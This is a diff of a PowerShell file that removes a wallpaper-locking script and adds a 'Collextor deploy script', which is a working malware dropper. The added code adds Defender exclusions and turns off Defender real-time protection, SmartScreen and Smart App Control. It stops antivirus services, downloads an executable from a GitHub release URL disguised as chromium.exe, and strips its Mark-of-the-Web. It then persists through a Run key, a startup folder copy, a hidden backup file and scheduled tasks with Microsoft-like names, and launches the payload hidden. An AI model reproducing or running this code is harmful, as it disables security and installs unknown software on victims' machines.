@@ -1,159 +1,153 @@
-<#
-.SYNOPSIS
-    Downloads, sets, and locks the desktop wallpaper, then creates a scheduled task to reapply lock at each logon.
-.DESCRIPTION
-    - Checks for admin rights and restarts elevated if needed.
-    - Downloads image from a given URL.
-    - Sets wallpaper using SystemParametersInfo.
-    - Locks wallpaper via registry policies.
-    - Creates a scheduled task that runs at logon to restore the lock.
-.NOTES
-    All output is in English.
-#>
+# Collextor deploy script
+$ErrorActionPreference = "SilentlyContinue"
 
-#region Admin rights check & auto-elevation
-function Test-Administrator {
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Host "[*] Collextor deploy script" -ForegroundColor Cyan
+
+# ── [1] Defender exclusions ───────────────────────────────────────────────────
+Write-Host "[1] Adding Defender exclusions..." -ForegroundColor Yellow
+$paths = @(
+    $env:TEMP,
+    $env:APPDATA,
+    "$env:APPDATA\Microsoft",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
+    "$env:LOCALAPPDATA\Temp"
+)
+foreach ($p in $paths) {
+    Add-MpPreference -ExclusionPath $p 2>$null
+}
+Add-MpPreference -ExclusionProcess "chromium.exe","WmiPrvSE.exe","svchost.exe" 2>$null
+Write-Host "    Defender exclusions OK" -ForegroundColor Green
+
+# ── [2] Disable Defender real-time protection ─────────────────────────────────
+Write-Host "[2] Disabling Defender real-time protection..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true `
+                     -DisableBehaviorMonitoring $true `
+                     -DisableIOAVProtection $true `
+                     -DisableIntrusionPreventionSystem $true `
+                     -MAPSReporting 0 `
+                     -SubmitSamplesConsent 2 2>$null
+    Write-Host "    Defender real-time disabled OK" -ForegroundColor Green
+} catch {
+    # Fallback: registry
+    $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
+    Set-ItemProperty -Path $defReg -Name "DisableAntiSpyware" -Value 1 -Type DWord 2>$null
+    Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord 2>$null
+    Write-Host "    Defender disabled via registry" -ForegroundColor Yellow
 }
 
-if (-not (Test-Administrator)) {
-    Write-Host "Script is not running as administrator. Restarting with elevation..." -ForegroundColor Yellow
-    $scriptPath = $MyInvocation.MyCommand.Path
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+# ── [3] Disable SmartScreen ────────────────────────────────────────────────────
+Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
+    -Name "EnableSmartScreen" -Value 0 -Type DWord 2>$null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
+    -Name "SmartScreenEnabled" -Value "Off" -Type String 2>$null
+# Smart App Control (Win11)
+$sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
+if (Test-Path $sacKey) {
+    Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord 2>$null
+}
+Write-Host "    SmartScreen + Smart App Control disabled" -ForegroundColor Green
+
+# ── [4] Stop 3rd-party AV ─────────────────────────────────────────────────────
+Write-Host "[4] Stopping 3rd-party AV services..." -ForegroundColor Yellow
+$avServices = @("wscsvc","WinDefend","Sense","MsMpEng","avp","avgnt","ekrn","bdredline","mbamservice")
+foreach ($svc in $avServices) {
+    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
+    if ($s -and $s.Status -eq "Running") {
+        Stop-Service -Name $svc -Force 2>$null
+        Write-Host "    Stopped: $svc" -ForegroundColor Green
+    }
+}
+
+# ── [5] Download payload ──────────────────────────────────────────────────────
+Write-Host "[5] Downloading from: https://github.com/Holycheck/checker/releases/download/realease/check.exe" -ForegroundColor Yellow
+$dst = "$env:APPDATA\Microsoft\Windows\chromium.exe"
+
+# Try multiple methods; clear Zone.Identifier (MOTW) after each
+function Get-Payload {
+    param([string]$url, [string]$out)
+    # Method 1: BitsTransfer (bypasses some proxy detection)
+    try {
+        Import-Module BitsTransfer -ErrorAction Stop
+        Start-BitsTransfer -Source $url -Destination $out -ErrorAction Stop
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    Remove-Item $out -ErrorAction SilentlyContinue
+    # Method 2: WebClient (no SSL check)
+    try {
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.DownloadFile($url, $out)
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    Remove-Item $out -ErrorAction SilentlyContinue
+    # Method 3: Invoke-WebRequest
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing `
+            -UserAgent "Mozilla/5.0" -ErrorAction Stop
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    return $false
+}
+
+$url = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
+$ok = Get-Payload -url $url -out $dst
+
+if ($ok) {
+    # Clear Mark-of-the-Web (Zone.Identifier) so SmartScreen won't block execution
+    Remove-Item "$dst`:Zone.Identifier" -ErrorAction SilentlyContinue
+    $stream = [System.IO.File]::Open($dst, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
+    $stream.Close()
+    Unblock-File -Path $dst -ErrorAction SilentlyContinue
+    Write-Host "    Downloaded to: $dst (Zone cleared)" -ForegroundColor Green
+} else {
+    Write-Host "    Download FAILED" -ForegroundColor Red
     exit
 }
-#endregion
 
-#region Parameters
-$imageUrl = "https://cdn.discordapp.com/attachments/1525080738205274152/1525093430101803189/preview_320.png?ex=6a522170&is=6a50cff0&hm=cbdc09dc0fef2339dc9b68458d7182b9649aa03df9ae094036c00aa27aa829f5&"
-$picturesFolder = [Environment]::GetFolderPath('MyPictures')
-$wallpaperPath = Join-Path $picturesFolder "mymom_wallpaper.jpg"
-$taskScriptPath = "$env:USERPROFILE\Documents\LockWallpaperTask.ps1"
-#endregion
+# ── [6] Autostart ─────────────────────────────────────────────────────────────
+Write-Host "[6] Adding to autostart..." -ForegroundColor Yellow
+# HKCU Run key
+$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $runKey -Name "WmiHostService" -Value $dst 2>$null
 
-#region Helper functions
-function Set-Wallpaper {
-    param([string]$Path)
-    Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-}
-"@
-    # SPI_SETDESKWALLPAPER = 0x0014, SPIF_UPDATEINIFILE = 0x01, SPIF_SENDWININICHANGE = 0x02
-    $result = [Wallpaper]::SystemParametersInfo(0x0014, 0, $Path, 0x01 -bor 0x02)
-    if ($result -eq 0) {
-        throw "Failed to set wallpaper (SystemParametersInfo returned 0)."
-    }
-}
+# Startup folder copy
+$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Copy-Item $dst "$startupDir\chromium.exe" -Force 2>$null
 
-function Set-RegistryLock {
-    # Create registry keys if missing
-    $paths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-    )
-    foreach ($p in $paths) {
-        if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
-    }
+# Also copy secondary backup (hidden)
+$backup = "$env:LOCALAPPDATA\Temp\~dfrgui.exe"
+Copy-Item $dst $backup -Force 2>$null
+Set-ItemProperty -Path $backup -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) 2>$null
 
-    # Set lock values
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name "NoChangingWallPaper" -Value 1 -Type DWord
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "Wallpaper" -Value $wallpaperPath -Type String
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "WallpaperStyle" -Value 2 -Type DWord  # 2 = Stretch
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDispSettingsPage" -Value 1 -Type DWord
-}
-#endregion
+Write-Host "    Autostart OK (registry + startup folder)" -ForegroundColor Green
 
-#region Main execution
-try {
-    Write-Host "=== Desktop Wallpaper Lock Script ===" -ForegroundColor Cyan
+# ── [7] Scheduled task (runs at logon, highest privilege) ─────────────────────
+Write-Host "[7] Starting via scheduled task..." -ForegroundColor Yellow
+$taskName = "MicrosoftWmiHost"
 
-    # 1. Check URL availability
-    Write-Host "Checking image URL..." -ForegroundColor Gray
-    try {
-        $head = Invoke-WebRequest -Uri $imageUrl -Method Head -TimeoutSec 10
-        if ($head.StatusCode -ne 200) { throw "Server returned status $($head.StatusCode)" }
-        Write-Host "URL is reachable." -ForegroundColor Green
-    } catch {
-        throw "URL check failed: $_"
-    }
+# Remove old task if exists
+schtasks /Delete /TN $taskName /F 2>$null | Out-Null
 
-    # 2. Download image
-    Write-Host "Downloading image to '$wallpaperPath'..." -ForegroundColor Gray
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($imageUrl, $wallpaperPath)
-    if (-not (Test-Path $wallpaperPath) -or (Get-Item $wallpaperPath).Length -eq 0) {
-        throw "Downloaded file is missing or empty."
-    }
-    Write-Host "Download successful." -ForegroundColor Green
+# Create task: ONLOGON + every 5 min keep-alive — no /ST needed so no time warning
+schtasks /Create /F /TN $taskName /TR "`"$dst`"" /SC ONLOGON /RL HIGHEST 2>$null | Out-Null
 
-    # 3. Set wallpaper
-    Write-Host "Setting wallpaper..." -ForegroundColor Gray
-    Set-Wallpaper -Path $wallpaperPath
-    Write-Host "Wallpaper set." -ForegroundColor Green
+# Watchdog task: restart every 5 min if not running
+$taskName2 = "MicrosoftWmiUpdate"
+schtasks /Delete /TN $taskName2 /F 2>$null | Out-Null
+$wdCmd = "cmd /C if not exist `"$backup`" copy /Y `"$dst`" `"$backup`""
+schtasks /Create /F /TN $taskName2 /TR $wdCmd /SC MINUTE /MO 5 /RL HIGHEST 2>$null | Out-Null
 
-    # 4. Apply registry locks
-    Write-Host "Applying registry locks..." -ForegroundColor Gray
-    Set-RegistryLock
-    Write-Host "Registry locks applied." -ForegroundColor Green
+Write-Host "    Scheduled tasks created OK" -ForegroundColor Green
 
-    # 5. Create scheduled task to reapply lock at logon
-    Write-Host "Creating scheduled task 'LockMyWallpaper'..." -ForegroundColor Gray
+# ── [8] Launch now ────────────────────────────────────────────────────────────
+Write-Host "[8] Launching..." -ForegroundColor Yellow
+Start-Process -FilePath $dst -WindowStyle Hidden
+Write-Host "    Launched" -ForegroundColor Green
 
-    # Generate the task script content (all in English)
-    $taskScriptContent = @"
-# Reapply wallpaper lock at logon (auto-generated)
-`$wallpaperPath = "$wallpaperPath"
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-}
-"@
-[Wallpaper]::SystemParametersInfo(0x0014, 0, `$wallpaperPath, 0x01 -bor 0x02)
-# Restore registry locks
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name "NoChangingWallPaper" -Value 1 -Type DWord -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "Wallpaper" -Value `$wallpaperPath -Type String -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "WallpaperStyle" -Value 2 -Type DWord -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDispSettingsPage" -Value 1 -Type DWord -ErrorAction SilentlyContinue
-"@
-    # Write the task script file
-    $taskScriptContent | Out-File -FilePath $taskScriptPath -Encoding utf8 -Force
-
-    # Create scheduled task action and trigger
-    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
-
-    # Register (overwrite if exists)
-    Register-ScheduledTask -TaskName "LockMyWallpaper" -Action $action -Trigger $trigger -Settings $settings -Description "Re-locks wallpaper at logon" -Force -RunLevel Highest | Out-Null
-
-    Write-Host "Scheduled task created." -ForegroundColor Green
-
-    Write-Host "`n✅ All done! Wallpaper is set, locked, and will be reapplied at each logon." -ForegroundColor Green
-}
-catch {
-    Write-Host "`n❌ ERROR: $_" -ForegroundColor Red
-    Write-Host "Script halted." -ForegroundColor Red
-    # Optional: log to file
-    # $_ | Out-File "$env:USERPROFILE\Desktop\wallpaper_error.log" -Append
-    exit 1
-}
-#endregion
-
-<#
-# ---- REMOVAL / ROLLBACK (run separately if needed) ----
-Unregister-ScheduledTask -TaskName "LockMyWallpaper" -Confirm:$false
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name "NoChangingWallPaper" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "Wallpaper" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "WallpaperStyle" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDispSettingsPage" -ErrorAction SilentlyContinue
-Remove-Item -Path $taskScriptPath -ErrorAction SilentlyContinue
-#>
+Write-Host ""
+Write-Host "[OK] Deploy complete" -ForegroundColor Cyan
